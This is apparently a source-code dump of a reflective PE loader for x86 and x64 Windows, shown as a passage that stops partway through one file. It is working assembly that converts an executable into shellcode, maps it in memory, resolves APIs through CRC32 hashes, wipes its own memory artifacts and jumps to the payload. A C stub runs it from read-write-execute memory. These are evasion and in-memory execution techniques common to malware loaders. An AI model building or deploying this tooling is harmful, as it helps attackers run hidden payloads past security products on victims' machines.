	lea    rax,[rsp+0x140]
	mov    rdx,rcx
	mov    rcx,rax
	call   memcpy
	lea    rcx,[rsp+0x30]
	call   load_module
	mov    rbx,rax
	mov    eax,0x0
	test   rbx,rbx
	je     loc_140003738 
	lea    rcx,[rsp+0x140]
	mov    edx,0x0
	call   calc_crc
	mov    edx,eax
	mov    r8d,0xffffffff
	mov    rcx,rbx
	call   get_proc_by_crc
	mov    rbx,rax
loc_140003735:
	mov    rax,rbx
loc_140003738:
	add    rsp,0x258
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	pop    r12
	pop    r13
	pop    r14
	pop    r15
	ret
loc_14000374c:
	mov    esi,0x0
	mov    r8d,0x0
	jmp    loc_1400036af 
loc_14000375c:
	mov    r8d,0x0
	jmp    loc_1400036e6 
loc_140003764:
	mov    eax,0x0
	jmp    loc_140003738 
```

`loader/loader-x64/inc/load_module.asm`:

```asm
[BITS 64]


load_module:
	push   rdi
	sub    rsp,0x250
	mov    r8,rcx
	mov    QWORD [rsp+0x248],0x0
	mov    DWORD [rsp+0x234],0x0
	lea    rdi,[rsp+0x20]
	mov    ecx,0x41
	mov    eax,0x0
	rep stosq
	cmp    BYTE [r8],0x0
	je     loc_140003873 
	mov    edx,0x1
loc_1400037eb:
	mov    rax,rdx
	add    rdx,0x1
	cmp    BYTE [r8+rdx*1-0x1],0x0
	jne    loc_1400037eb 
	lea    edx,[rax+rax*1]
	mov    WORD [rsp+0x230],dx
	add    edx,0x2
	mov    WORD [rsp+0x232],dx
	lea    rdx,[rsp+0x20]
	mov    QWORD [rsp+0x238],rdx
	sub    eax,0x1
	js     loc_140003837 
	cdqe
loc_140003824:
	movsx  dx,BYTE [r8+rax*1]
	mov    WORD [rsp+rax*2+0x20],dx
	sub    rax,0x1
	test   eax,eax
	jns    loc_140003824 
loc_140003837:
	lea    r9,[rsp+0x248]
	lea    r8,[rsp+0x230]
	mov    edx,0x0
	mov    ecx,0x0
	mov    r10, 0xB4EBB9A4
	call   api_call
	call   rax        ; <LdrLoadDll>
	test   eax,eax
	js     loc_14000386c 
	mov    rax,QWORD [rsp+0x248]
loc_140003863:
	add    rsp,0x250
	pop    rdi
	ret
loc_14000386c:
	mov    eax,0x0
	jmp    loc_140003863 
loc_140003873:
	mov    WORD [rsp+0x230],0x0
	mov    WORD [rsp+0x232],0x2
	lea    rax,[rsp+0x20]
	mov    QWORD [rsp+0x238],rax
	jmp    loc_140003837
```

`loader/loader-x64/inc/map_image.asm`:

```asm
[BITS 64]


map_image:
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x48
	mov    rbp,rcx
	movsxd rdi,DWORD [rcx+0x3c]
	add    rdi,rcx
	mov    eax,0x0
	cmp    DWORD [rdi],0x4550
	jne    loc_1400020b8 
	mov    QWORD [rsp+0x38],0x0
	mov    eax,DWORD [rdi+0x50]
	mov    QWORD [rsp+0x30],rax
	lea    rdx,[rsp+0x38]
	mov    DWORD [rsp+0x28],0x4
	mov    DWORD [rsp+0x20],0x103000
	lea    r9,[rsp+0x30]
	mov    r8d,0x0
	mov    rcx,0xffffffffffffffff
	mov    r10, 0x99CE7C55
	call   api_call
	call   rax        ; <NtAllocateVirtualMemory>
	mov    edx,eax
	mov    eax,0x0
	test   edx,edx
	js     loc_1400020b8 
	mov    r8d,DWORD [rdi+0x54]
	mov    rdx,rbp
	mov    rcx,QWORD [rsp+0x38]
	call   memcpy
	movzx  eax,WORD [rdi+0x14]
	lea    rbx,[rdi+rax*1+0x18]
	cmp    WORD [rdi+0x6],0x0
	je     loc_1400020b3 
	mov    esi,0x0
loc_14000208d:
	mov    ecx,DWORD [rbx+0xc]
	add    rcx,QWORD [rsp+0x38]
	mov    edx,DWORD [rbx+0x14]
	add    rdx,rbp
	mov    r8d,DWORD [rbx+0x10]
	call   memcpy
	add    esi,0x1
	add    rbx,0x28
	movzx  eax,WORD [rdi+0x6]
	cmp    eax,esi
	jg     loc_14000208d 
loc_1400020b3:
	mov    rax,QWORD [rsp+0x38]
loc_1400020b8:
	add    rsp,0x48
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	ret
```

`loader/loader-x64/inc/memcpy.asm`:

```asm
[BITS 64]

; memcpy(&dst, &src, size)
; RCX = &dst
; RDX = &src
; R8  = size
memcpy:
	push rsi
	push rdi
	mov rdi,rcx
	mov rsi,rdx
	mov rcx,r8
copy_byte:
	rep movsb            ; Copy the CX number of bytes from RSI to RDI
	pop rdi              ; Restore RDI
	pop rsi              ; Restore RSI
	ret                  ; Return
```

`loader/loader-x64/inc/protect_sections.asm`:

```asm
[BITS 64]


protect_sections:
	push   r14
	push   r13
	push   r12
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x50
	mov    rbp,rcx
	movsxd rdi,DWORD [rcx+0x3c]
	add    rdi,rcx
	movzx  eax,WORD [rdi+0x14]
	lea    rbx,[rdi+rax*1+0x18]
	mov    QWORD [rsp+0x48],0x0
	cmp    WORD [rdi+0x6],0x0
	je     loc_140002e87 
	mov    esi,0x0
	mov    r12d,0x0
	lea    r14,[rsp+0x40]
	lea    r13,[rsp+0x48]
	jmp    loc_140002f50 
loc_140002e38:
	mov    ecx,0x1
loc_140002e3d:
	and    eax,0x60000000
	mov    r8d,0x1
	cmp    eax,0x60000000
	mov    r9d,0x20
	mov    eax,0x80
	cmovne r9d,eax
	jmp    loc_140002eed 
loc_140002e61:
	mov    r9d,0x20
	jmp    loc_140002efd 
loc_140002e6c:
	mov    eax,0x0
	jmp    loc_140002e78 
loc_140002e73:
	mov    eax,0x1
loc_140002e78:
	add    rsp,0x50
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	pop    r12
	pop    r13
	pop    r14
	ret
loc_140002e87:
	mov    eax,0x1
	jmp    loc_140002e78 
loc_140002e8e:
	mov    ecx,0x1
	mov    r8d,r12d
	mov    r9d,0x10
	jmp    loc_140002edd 
loc_140002e9e:
	mov    ecx,r12d
	test   eax,0x20000000
	je     loc_140002eda 
	mov    ecx,0x0
	test   eax,eax
	js     loc_140002e3d 
	mov    ecx,eax
	shr    ecx,0x1f
	mov    r8d,ecx
	mov    ecx,r12d
	mov    r9d,0x10
	jmp    loc_140002edd 
loc_140002ec4:
	test   eax,0x20000000
	jne    loc_140002e38 
	mov    ecx,0x1
	mov    r9d,0x4
loc_140002eda:
	mov    r8d,r12d
loc_140002edd:
	and    eax,0x60000000
	cmp    eax,0x60000000
	je     loc_140002e61 
loc_140002eed:
	test   cl,cl
	je     loc_140002efd 
	test   r8b,r8b
	mov    eax,0x40
	cmovne r9d,eax
loc_140002efd:
	mov    eax,DWORD [rdx+0xc]
	add    rax,rbp
	mov    QWORD [rsp+0x48],rax
	mov    eax,DWORD [rdx+0x10]
	mov    QWORD [rsp+0x40],rax
	mov    DWORD [rsp+0x3c],0x0
	lea    rax,[rsp+0x3c]
	mov    QWORD [rsp+0x20],rax
	mov    r8,r14
	mov    rdx,r13
	mov    rcx,0xffffffffffffffff
	mov    r10, 0x6EDE4D41
	call   api_call
	call   rax        ; <NtProtectVirtualMemory>
	test   eax,eax
	js     loc_140002e6c 
loc_140002f3d:
	add    esi,0x1
	add    rbx,0x28
	movzx  eax,WORD [rdi+0x6]
	cmp    eax,esi
	jle    loc_140002e73 
loc_140002f50:
	mov    rdx,rbx
	mov    eax,DWORD [rbx+0x24]
	test   eax,eax
	je     loc_140002f3d 
	mov    r9d,eax
	sar    r9d,0x1f
	and    r9d,0xffffffc8
	add    r9d,0x40
	test   eax,0x40000000
	je     loc_140002e9e 
	test   eax,eax
	js     loc_140002ec4 
	test   eax,0x20000000
	jne    loc_140002e8e 
	mov    ecx,0x1
	mov    r9d,0x2
	jmp    loc_140002eda 
```

`loader/loader-x64/inc/relocate_image.asm`:

```asm
[BITS 64]


relocate_image:
	mov    r9,rcx
	movsxd rdx,DWORD [rcx+0x3c]
	add    rdx,rcx
	mov    eax,DWORD [rdx+0xb0]
	mov    ecx,0x0
	test   eax,eax
	je     loc_14000261a 
	mov    eax,eax
	lea    rcx,[r9+rax*1]
	mov    r10,r9
	sub    r10,QWORD [rdx+0x30]
	cmp    DWORD [rcx],0x0
	jne    loc_140002601 
	mov    ecx,0x1
	jmp    loc_14000261a 
loc_1400025bd:
	mov    edx,DWORD [rcx]
	movzx  r8d,WORD [rax]
	and    r8d,0xfff
	add    rdx,r8
	add    QWORD [r9+rdx*1],r10
loc_1400025d1:
	add    rax,0x2
	mov    edx,DWORD [rcx+0x4]
	add    rdx,rcx
	cmp    rax,rdx
	je     loc_1400025f9 
loc_1400025e0:
	movzx  edx,BYTE [rax+0x1]
	mov    r8d,edx
	and    r8d,0xfffffff0
	cmp    r8b,0xa0
	je     loc_1400025bd 
	cmp    dl,0xf
	jbe    loc_1400025d1 
	jmp    loc_1400025d1 
loc_1400025f9:
	mov    rcx,rax
loc_1400025fc:
	cmp    DWORD [rcx],0x0
	je     loc_140002615 
loc_140002601:
	lea    rax,[rcx+0x8]
	mov    edx,DWORD [rcx+0x4]
	add    rdx,rcx
	cmp    rax,rdx
	jne    loc_1400025e0 
	mov    rcx,rdx
	jmp    loc_1400025fc 
loc_140002615:
	mov    ecx,0x1
loc_14000261a:
	mov    eax,ecx
	ret
```

`loader/loader-x64/inc/resolve_imports.asm`:

```asm
[BITS 64]


resolve_imports:
	push   r12
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x20
	mov    rbp,rcx
	movsxd rax,DWORD [rcx+0x3c]
	mov    eax,DWORD [rcx+rax*1+0x90]
	mov    edx,0x0
	test   eax,eax
	je     loc_140002966 
	mov    eax,eax
	lea    r12,[rcx+rax*1]
	mov    ecx,DWORD [r12+0xc]
	test   ecx,ecx
	jne    loc_14000292f 
	mov    edx,0x1
	jmp    loc_140002966 
loc_1400028cf:
	mov    edx,0x0
	mov    rcx,rdi
	call   get_proc_by_crc
	test   rax,rax
	je     loc_1400028e4 
	mov    QWORD [rsi],rax
loc_1400028e4:
	add    rbx,0x8
	add    rsi,0x8
	mov    r8,QWORD [rbx]
	test   r8,r8
	je     loc_140002922 
loc_1400028f4:
	test   r8,r8
	js     loc_1400028cf 
	lea    rcx,[rbp+r8*1+0x2]
	mov    edx,0x0
	call   calc_crc
	mov    edx,eax
	mov    r8d,0xffffffff
	mov    rcx,rdi
	call   get_proc_by_crc
	test   rax,rax
	je     loc_1400028e4 
	mov    QWORD [rsi],rax
loc_140002920:
	jmp    loc_1400028e4 
loc_140002922:
	add    r12,0x14
	mov    ecx,DWORD [r12+0xc]
	test   ecx,ecx
	je     loc_14000295a 
loc_14000292f:
	mov    ecx,ecx
	add    rcx,rbp
	call   load_module
	mov    rdi,rax
	test   rax,rax
	je     loc_140002961 
	mov    ebx,DWORD [r12]
	add    rbx,rbp
	mov    esi,DWORD [r12+0x10]
	add    rsi,rbp
	mov    r8,QWORD [rbx]
	test   r8,r8
	jne    loc_1400028f4 
	jmp    loc_140002922 
loc_14000295a:
	mov    edx,0x1
	jmp    loc_140002966 
loc_140002961:
	mov    edx,0x0
loc_140002966:
	mov    eax,edx
	add    rsp,0x20
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	pop    r12
	ret
```

`loader/loader-x64/inc/run_tls_callbacks.asm`:

```asm
[BITS 64]


run_tls_callbacks:
	push   rsi
	push   rbx
	sub    rsp,0x28
	mov    rsi,rcx
	movsxd rax,DWORD [rcx+0x3c]
	mov    eax,DWORD [rcx+rax*1+0xd0]
	mov    edx,0x0
	test   eax,eax
	je     loc_1400033ad 
	mov    eax,eax
	mov    rbx,QWORD [rcx+rax*1+0x18]
	mov    edx,0x1
	test   rbx,rbx
	jne    loc_1400033ca 
loc_1400033ad:
	mov    eax,edx
	add    rsp,0x28
	pop    rbx
	pop    rsi
	ret
loc_1400033b6:
	mov    r8d,0x0
	mov    edx,0x1
	mov    rcx,rsi
	call   rax
	add    rbx,0x8
loc_1400033ca:
	mov    rax,QWORD [rbx]
	test   rax,rax
	jne    loc_1400033b6 
	mov    edx,0x1
	jmp    loc_1400033ad 
```

`loader/loader-x64/loader-x64-lite.asm`:

```asm
;#==============================================#
;# X64 Reflective Loader                        #
;# Author: Ege Balcı <egebalci@pm.me>           #
;# Version: 3.0                                 #
;#==============================================#
;
[BITS 64]

%define e_lfanew 0x3C
%define _AddressOfEntry 0x28
loader_size	equ     pe_start-loader


  call loader                               ; Get the address of PE image to stack
loader:
	pop rsi                                  ; Get current address to RSI
	add rsi, loader_size                     ; Add the total loader size
	push rbp                                 ; Save RBP
	mov rbp,rsp                              ; Create a stack frame
	mov rcx,rsi                              ; Move the image address as first parameter
	call map_image                           ; Perform PE image mapping
	mov rdi, rax                             ; Get the address of mapped PE image into RDI
	mov rcx, rdi                             ; Move a copy of the mapped image address into RCX as first parameter
	call resolve_imports                     ; Resolve image imports
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call relocate_image                      ; Perform image base relocation
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call protect_sections                    ; Apply proper section memory protections
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call run_tls_callbacks                   ; Try to execute TLS callbacks. May fail... ¯\_(ツ)_/¯
	xor rax, rax                             ; Clear out RAX
	mov eax, DWORD [rdi+e_lfanew]            ; Get the file header offset
	mov eax, DWORD [rdi+rax+_AddressOfEntry] ; Get the AddressOfEntry into EAX
	add rax,rdi                              ; Add the AOE onto new image base
	cld                               ; Clear direction flags
	mov rsp, rbp                      ; Restore stack frame
	pop rbp                           ; Restore RBP
	jmp rax                           ; Jmp to the PE->AOE
	; ------------------------ FUNCTIONS ------------------------------------
	%include "./inc/memcpy.asm"
	%include "./inc/calc_crc.asm"
	%include "./inc/map_image.asm"
	%include "./inc/load_module.asm"
	%include "./inc/relocate_image.asm"
	%include "./inc/resolve_imports.asm"
	%include "./inc/get_proc_by_crc.asm"
	%include "./inc/get_module_by_crc.asm"
	%include "./inc/protect_sections.asm"
	%include "./inc/run_tls_callbacks.asm"
	%include "../crc32_api/crc32_api_x64.asm"
	;------------------------ FUNCTIONS -------------------------------------
pe_start:
```

`loader/loader-x64/loader-x64.asm`:

```asm
;#==============================================#
;# X64 Reflective Loader                        #
;# Author: Ege Balcı <egebalci@pm.me>           #
;# Version: 3.0                                 #
;#==============================================#
;
[BITS 64]

%define e_lfanew 0x3C
%define _AddressOfEntry 0x28

  call start                                 ; Get the address of PE image to stack
  incbin "putty.exe"                         ; PE file.
start:
	pop rsi                                  ; Get the address of PE to RSI
	push rbp                                 ; Save RBP
	mov rbp,rsp                              ; Create a stack frame
	mov rcx,rsi                              ; Move the image address as first parameter
	call map_image                           ; Perform PE image mapping
	mov rdi, rax                             ; Get the address of mapped PE image into RDI
	mov rcx, rdi                             ; Move a copy of the mapped image address into RCX as first parameter
	call resolve_imports                     ; Resolve image imports
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call relocate_image                      ; Perform image base relocation
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call protect_sections                    ; Apply proper section memory protections
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call run_tls_callbacks                   ; Try to execute TLS callbacks. May fail... ¯\_(ツ)_/¯
	xor rax, rax                             ; Clear out RAX
	mov eax, DWORD [rdi+e_lfanew]            ; Get the file header offset
	mov eax, DWORD [rdi+rax+_AddressOfEntry] ; Get the AddressOfEntry into EAX
	add rax,rdi                              ; Add the AOE onto new image base
	jmp wipe                                 ; Start wiping memory artifacts...
	; ------------------------ FUNCTIONS ------------------------------------
	%include "./inc/memcpy.asm"
	%include "./inc/calc_crc.asm"
	%include "./inc/map_image.asm"
	%include "./inc/load_module.asm"
	%include "./inc/relocate_image.asm"
	%include "./inc/resolve_imports.asm"
	%include "./inc/get_proc_by_crc.asm"
	%include "./inc/get_module_by_crc.asm"
	%include "./inc/protect_sections.asm"
	%include "./inc/run_tls_callbacks.asm"
	%include "../crc32_api/crc32_api_x64.asm"
	;------------------------ FUNCTIONS -------------------------------------
wipe:
	wipe_len_delta	equ     wipe_end-wipe
	call $+5                          ; Get current EIP to stack
	pop rcx                           ; Pop currect EIP to RCX
	sub rcx,rsi                       ; Calculate the size of the PE file
	add rcx,wipe_len_delta            ; Add the size of wipe code 
	mov rdi,rsi                       ; Move the PE address to RDI
	sub rdi,0x5                       ; Go back 5 bytes for wiping the initial call as well
wipe_end:
	rep stosb                         ; Store AL into RDI and decrement RDI until RCX = 0
	; -------------------- SWITCH TO PE ----------------------------
	cld                               ; Clear direction flags
	mov rsp, rbp                      ; Restore stack frame
	pop rbp                           ; Restore RBP
	jmp rax                           ; Jmp to the PE->AOE
```

`loader/loader-x64/stub.c`:

```c
#include <windows.h>
#include "shellcode.h"

int main(int argc, char const *argv[])
{
	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(BUFFER, shellcode, sizeof(shellcode));
	(*(void(*)())BUFFER)();
	return 0;
}

```

`loader/loader-x86/build.sh`:

```sh
#!/bin/bash
## ANSI Colors (FG & BG)
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" YELLOW="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" YELLOWBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESET="$(printf '\e[0m')"

print_warning() {
  echo ${YELLOW}"[!] ${RESET}${1}"
}
print_error() {
  echo "${RED}[-] ${RESET}${1}"
}
print_fatal() {
  echo -e ${RED}"[!] $1\n${RESET}"
  kill -10 $$
}
print_good() {
  echo "${GREEN}[+] ${RESET}${1}"
}
print_status() {
    echo "${YELLOW}[*] ${RESET}${1}"
}

nasm -f bin loader-x86.asm -o shellcode || print_fatal "nasm failed!"
print_status "Payload Size: `wc -c shellcode|cut -d' ' -f1`"
[[ -f shellcode ]] && xxd -i shellcode shellcode.h

i686-w64-mingw32-gcc stub.c -o test.exe || print_fatal "Compilation failed!"
cp test.exe /tmp/
rm shellcode shellcode.h
print_good "Build done!" 

```

`loader/loader-x86/inc/calc_crc.asm`:

```asm
[BITS 32]


calc_crc:
loc_40b22f:	mov    eax,DWORD [esp+0x4]
loc_40b233:	mov    edx,DWORD [esp+0x8]
loc_40b237:	test   dx,dx
loc_40b23a:	je     loc_40b256 
loc_40b23c:	mov    ecx,eax
loc_40b23e:	movzx  edx,dx
loc_40b241:	add    eax,edx
loc_40b243:	mov    edx,0x0
loc_40b248:	crc32  edx,BYTE [ecx]
loc_40b24d:	add    ecx,0x1
loc_40b250:	cmp    ecx,eax
loc_40b252:	jne    loc_40b248 
loc_40b254:	jmp    loc_40b275 
loc_40b256:	movzx  ecx,BYTE [eax]
loc_40b259:	test   cl,cl
loc_40b25b:	je     loc_40b278 
loc_40b25d:	add    eax,0x1
loc_40b260:	mov    edx,0x0
loc_40b265:	crc32  edx,cl
loc_40b26a:	add    eax,0x1
loc_40b26d:	movzx  ecx,BYTE [eax-0x1]
loc_40b271:	test   cl,cl
loc_40b273:	jne    loc_40b265 
loc_40b275:	mov    eax,edx
loc_40b277:	ret
loc_40b278:	mov    edx,0x0
loc_40b27d:	jmp    loc_40b275 

```

`loader/loader-x86/inc/get_module_by_crc.asm`:

```asm
[BITS 32]


get_module_by_crc:
loc_4077e7:	push   edi
loc_4077e8:	push   esi
loc_4077e9:	push   ebx
loc_4077ea:	sub    esp,0x8
loc_4077ed:	mov    edi,DWORD [esp+0x18]
loc_4077f1:	mov    eax,fs:0x30
loc_4077f7:	mov    eax,DWORD [eax+0xc]
loc_4077fa:	lea    esi,[eax+0x14]
loc_4077fd:	mov    ebx,DWORD [eax+0x14]
loc_407800:	cmp    esi,ebx
loc_407802:	je     loc_407832 
loc_407804:	movzx  eax,WORD [ebx+0x24]
loc_407808:	mov    DWORD [esp+0x4],eax
loc_40780c:	mov    eax,DWORD [ebx+0x28]
loc_40780f:	mov    DWORD [esp],eax
loc_407812:	call   calc_crc
loc_407817:	cmp    eax,edi
loc_407819:	je     loc_407828 
loc_40781b:	mov    ebx,DWORD [ebx]
loc_40781d:	cmp    esi,ebx
loc_40781f:	jne    loc_407804 
loc_407821:	mov    eax,0x0
loc_407826:	jmp    loc_40782b 
loc_407828:	mov    eax,DWORD [ebx+0x10]
loc_40782b:	add    esp,0x8
loc_40782e:	pop    ebx
loc_40782f:	pop    esi
loc_407830:	pop    edi
loc_407831:	ret
loc_407832:	mov    eax,0x0
loc_407837:	jmp    loc_40782b 

```

`loader/loader-x86/inc/get_proc_by_crc.asm`:

```asm
[BITS 32]


get_proc_by_crc:
loc_408e97:	push   ebp
loc_408e98:	mov    ebp,esp
loc_408e9a:	push   edi
loc_408e9b:	push   esi
loc_408e9c:	push   ebx
loc_408e9d:	and    esp,0xfffffff0
loc_408ea0:	sub    esp,0x240
loc_408ea6:	mov    ebx,DWORD [ebp+0x8]
loc_408ea9:	mov    eax,ebx
loc_408eab:	add    eax,DWORD [ebx+0x3c]
loc_408eae:	mov    edx,ebx
loc_408eb0:	add    edx,DWORD [eax+0x78]
loc_408eb3:	mov    eax,DWORD [eax+0x7c]
loc_408eb6:	mov    DWORD [esp+0x1c],eax
loc_408eba:	mov    edi,DWORD [edx+0x20]
loc_408ebd:	mov    eax,DWORD [edx+0x1c]
loc_408ec0:	mov    DWORD [esp+0x2c],eax
loc_408ec4:	mov    eax,DWORD [edx+0x24]
loc_408ec7:	mov    DWORD [esp+0x28],eax
loc_408ecb:	mov    ecx,DWORD [edx+0x18]
loc_408ece:	test   ecx,ecx
loc_408ed0:	je     loc_409041 
loc_408ed6:	mov    esi,0x0
loc_408edb:	add    edi,ebx
loc_408edd:	mov    DWORD [esp+0x24],edx
loc_408ee1:	mov    DWORD [esp+0x20],ecx
loc_408ee5:	mov    DWORD [esp+0x4],0x0
loc_408eed:	mov    eax,ebx
loc_408eef:	add    eax,DWORD [edi+esi*4]
loc_408ef2:	mov    DWORD [esp],eax
loc_408ef5:	call   calc_crc
loc_408efa:	cmp    DWORD [ebp+0x10],esi
loc_408efd:	je     loc_408f19 
loc_408eff:	cmp    eax,DWORD [ebp+0xc]
loc_408f02:	je     loc_408f19 
loc_408f04:	add    esi,0x1
loc_408f07:	mov    eax,DWORD [esp+0x20]
loc_408f0b:	cmp    esi,eax
loc_408f0d:	jne    loc_408ee5 
loc_408f0f:	mov    eax,0x0
loc_408f14:	jmp    loc_409023 
loc_408f19:	mov    edx,DWORD [esp+0x24]
loc_408f1d:	lea    eax,[ebx+esi*2]
loc_408f20:	mov    ecx,DWORD [esp+0x28]
loc_408f24:	movzx  eax,WORD [eax+ecx*1]
loc_408f28:	lea    eax,[ebx+eax*4]
loc_408f2b:	mov    ecx,DWORD [esp+0x2c]
loc_408f2f:	add    ebx,DWORD [eax+ecx*1]
loc_408f32:	cmp    ebx,edx
loc_408f34:	jb     loc_409021 
loc_408f3a:	mov    eax,DWORD [esp+0x1c]
loc_408f3e:	add    edx,eax
loc_408f40:	cmp    ebx,edx
loc_408f42:	jae    loc_409021 
loc_408f48:	vpxor  xmm0,xmm0,xmm0
loc_408f4c:	vmovdqu [esp+0x38],xmm0
loc_408f52:	lea    edi,[esp+0x48]
loc_408f56:	mov    eax,0x0
loc_408f5b:	mov    ecx,0x3d
loc_408f60:	rep stosd
loc_408f62:	vmovdqu [esp+0x13c],xmm0
loc_408f6b:	lea    edi,[esp+0x14c]
loc_408f72:	mov    ecx,0x3d
loc_408f77:	rep stosd
loc_408f79:	cmp    BYTE [ebx],0x2e
loc_408f7c:	je     loc_40902b 
loc_408f82:	mov    esi,0x0
loc_408f87:	add    esi,0x1
loc_408f8a:	mov    eax,esi
loc_408f8c:	cmp    BYTE [ebx+esi*1],0x2e
loc_408f90:	jne    loc_408f87 
loc_408f92:	lea    edx,[esp+0x38]
loc_408f96:	mov    DWORD [esp+0x8],eax
loc_408f9a:	mov    DWORD [esp+0x4],ebx
loc_408f9e:	mov    DWORD [esp],edx
loc_408fa1:	call   memcpy
loc_408fa6:	lea    ecx,[ebx+esi*1+0x1]
loc_408faa:	cmp    BYTE [ecx],0x0
loc_408fad:	je     loc_40903a 
loc_408fb3:	mov    eax,0x0
loc_408fb8:	add    esi,ebx
loc_408fba:	add    eax,0x1
loc_408fbd:	mov    edx,eax
loc_408fbf:	cmp    BYTE [esi+eax*1+0x1],0x0
loc_408fc4:	jne    loc_408fba 
loc_408fc6:	lea    eax,[esp+0x13c]
loc_408fcd:	mov    DWORD [esp+0x8],edx
loc_408fd1:	mov    DWORD [esp+0x4],ecx
loc_408fd5:	mov    DWORD [esp],eax
loc_408fd8:	call   memcpy
loc_408fdd:	lea    eax,[esp+0x38]
loc_408fe1:	mov    DWORD [esp],eax
loc_408fe4:	call   load_module
loc_408fe9:	mov    ebx,eax
loc_408feb:	mov    eax,0x0
loc_408ff0:	test   ebx,ebx
loc_408ff2:	je     loc_409023 
loc_408ff4:	mov    DWORD [esp+0x4],0x0
loc_408ffc:	lea    eax,[esp+0x13c]
loc_409003:	mov    DWORD [esp],eax
loc_409006:	call   calc_crc
loc_40900b:	mov    DWORD [esp+0x8],0xffffffff
loc_409013:	mov    DWORD [esp+0x4],eax
loc_409017:	mov    DWORD [esp],ebx
loc_40901a:	call   get_proc_by_crc
loc_40901f:	mov    ebx,eax
loc_409021:	mov    eax,ebx
loc_409023:	lea    esp,[ebp-0xc]
loc_409026:	pop    ebx
loc_409027:	pop    esi
loc_409028:	pop    edi
loc_409029:	pop    ebp
loc_40902a:	ret
loc_40902b:	mov    esi,0x0
loc_409030:	mov    eax,0x0
loc_409035:	jmp    loc_408f92 
loc_40903a:	mov    edx,0x0
loc_40903f:	jmp    loc_408fc6 
loc_409041:	mov    eax,0x0
loc_409046:	jmp    loc_409023 

```

`loader/loader-x86/inc/load_module.asm`:

```asm
[BITS 32]


load_module:
loc_40a08a:	push   edi
loc_40a08b:	push   ebx
loc_40a08c:	sub    esp,0x234
loc_40a092:	mov    ebx,DWORD [esp+0x240]
loc_40a099:	mov    DWORD [esp+0x22c],0x0
loc_40a0a4:	lea    edi,[esp+0x1c]
loc_40a0a8:	mov    ecx,0x82
loc_40a0ad:	mov    eax,0x0
loc_40a0b2:	rep stosd
loc_40a0b4:	cmp    BYTE [ebx],0x0
loc_40a0b7:	je     loc_40a14c 
loc_40a0bd:	mov    edx,0x0
loc_40a0c2:	mov    eax,edx
loc_40a0c4:	add    edx,0x1
loc_40a0c7:	cmp    BYTE [ebx+edx*1],0x0
loc_40a0cb:	jne    loc_40a0c2 
loc_40a0cd:	add    edx,edx
loc_40a0cf:	mov    WORD [esp+0x224],dx
loc_40a0d7:	add    edx,0x2
loc_40a0da:	mov    WORD [esp+0x226],dx
loc_40a0e2:	lea    edx,[esp+0x1c]
loc_40a0e6:	mov    DWORD [esp+0x228],edx
loc_40a0ed:	test   eax,eax
loc_40a0ef:	js     loc_40a103 
loc_40a0f1:	movsx  dx,BYTE [ebx+eax*1]
loc_40a0f6:	mov    WORD [esp+eax*2+0x1c],dx
loc_40a0fb:	sub    eax,0x1
loc_40a0fe:	cmp    eax,0xffffffff
loc_40a101:	jne    loc_40a0f1 
loc_40a103:	lea    eax,[esp+0x22c]
loc_40a10a:	mov    DWORD [esp+0xc],eax
loc_40a10e:	lea    eax,[esp+0x224]
loc_40a115:	mov    DWORD [esp+0x8],eax
loc_40a119:	mov    DWORD [esp+0x4],0x0
loc_40a121:	mov    DWORD [esp],0x0
loc_111111: push   0xB4EBB9A4
loc_222222: call   api_call
loc_xxxxxx: add    esp,4
loc_40a128:	call   eax
loc_40a12e:	sub    esp,0x10
loc_40a131:	test   eax,eax
loc_40a133:	js     loc_40a145 
loc_40a135:	mov    eax,DWORD [esp+0x22c]
loc_40a13c:	add    esp,0x234
loc_40a142:	pop    ebx
loc_40a143:	pop    edi
loc_40a144:	ret
loc_40a145:	mov    eax,0x0
loc_40a14a:	jmp    loc_40a13c 
loc_40a14c:	mov    WORD [esp+0x224],0x0
loc_40a156:	mov    WORD [esp+0x226],0x2
loc_40a160:	lea    eax,[esp+0x1c]
loc_40a164:	mov    DWORD [esp+0x228],eax
loc_40a16b:	jmp    loc_40a103 

```

`loader/loader-x86/inc/map_image.asm`:

```asm
[BITS 32]


map_image:
loc_401f00:	push   ebp
loc_401f01:	push   edi
loc_401f02:	push   esi
loc_401f03:	push   ebx
loc_401f04:	sub    esp,0x3c
loc_401f07:	mov    ebp,DWORD [esp+0x50]
loc_401f0b:	mov    edi,ebp
loc_401f0d:	add    edi,DWORD [ebp+0x3c]
loc_401f10:	mov    eax,0x0
loc_401f15:	cmp    DWORD [edi],0x4550
loc_401f1b:	jne    loc_401fcf 
loc_401f21:	mov    DWORD [esp+0x2c],0x0
loc_401f29:	mov    eax,DWORD [edi+0x50]
loc_401f2c:	mov    DWORD [esp+0x28],eax
loc_401f30:	mov    DWORD [esp+0x14],0x4
loc_401f38:	mov    DWORD [esp+0x10],0x103000
loc_401f40:	lea    eax,[esp+0x28]
loc_401f44:	mov    DWORD [esp+0xc],eax
loc_401f48:	mov    DWORD [esp+0x8],0x0
loc_401f50:	lea    eax,[esp+0x2c]
loc_401f54:	mov    DWORD [esp+0x4],eax
loc_401f58:	mov    DWORD [esp],0xffffffff
loc_333333: push   0x99CE7C55
loc_444444: call   api_call
loc_yyyyyy: add    esp,4
loc_401f5f:	call   eax
